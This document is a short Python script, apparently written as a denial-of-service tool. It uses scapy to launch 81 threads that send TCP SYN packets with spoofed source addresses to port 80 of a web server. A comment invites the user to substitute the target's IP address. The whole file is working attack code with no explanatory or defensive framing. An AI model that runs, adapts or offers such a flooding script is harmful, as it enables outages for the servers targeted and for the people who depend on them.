from scapy.all import *
import threading

class ddos(threading.Thread):
    def __init__(self,src,dst,sport):
        threading.Thread.__init__(self)
        self.src = src
        self.dst = dst
        self.s_port = sport
    def run(self):
        p = IP(src = self.src, dst = self.dst)/TCP(sport = self.s_port, dport = 80,seq=1000,ack=1023,window=1000,flags="S")
        send(p)
        print "SENT PACKET --> 192.168.40.138 in from source %s and port %s"%(self.src,self.s_port)
        ans,unans=srloop(p,inter=0.1,retry=2,timeout=4)
	  
def main():
   dst = "192.168.40.138" # Change to the ip address of the web server
   for i in range(1,10):
      for j in range(1,10):
         src = "15.1.%s.%s"%(i,j)  
         try:
             worker = ddos(src,dst,1025+i+j) 
             worker.start()  
         except:
             pass
if __name__ == "__main__":
   main()
